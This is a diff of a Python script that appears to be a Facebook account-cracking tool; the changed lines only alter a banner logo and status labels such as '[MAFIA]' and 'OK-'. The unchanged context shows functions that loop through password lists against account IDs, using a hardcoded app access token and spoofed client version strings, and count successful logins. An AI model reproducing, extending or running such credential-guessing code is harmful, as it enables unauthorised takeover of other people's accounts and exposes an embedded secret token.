@@ -113,7 +113,7 @@ Y ='\x1b[1;93m'
 uu ='\x1b[1;95m'
 logo=("""\033[1;37m
      
-________________________           _____________________________________
+█______________________   __           _____________________________________
 ___  __ )__  ____/__  | / /           ___  __ \__    |__  /___    |_  ____/
 __  __  |_  __/  __   |/ /_______     __  / / /_  /| |_  / __  /| |  / __  
 _  /_/ /_  /___  _  /|  /_/_____/     _  /_/ /_  ___ |  /___  ___ / /_/ /  
@@ -310,7 +310,7 @@ def afg():
 def rd1(ids,passlist):
 	try:
 		global ok,loop,sim_id
-		sys.stdout.write('\r\r\33[1;37m [MAFIA]  %s|  OK-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+		sys.stdout.write('\r\r\33[1;37m [MAFIA]  %s|  OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 		for pas in passlist:
 				accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
 				fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
@@ -364,7 +364,7 @@ def rd1(ids,passlist):
 def api1(ids,names,passlist):
 	try:
 		global ok,loop,sim_id
-		sys.stdout.write('\r\r\33[1;37m[DALAG-T2]  %s|  OK-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+		sys.stdout.write('\r\r\33[1;37m[DALAG-T2]  %s|  OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 		fn = names.split(' ')[0]
 		try:
 			ln = names.split(' ')[1]
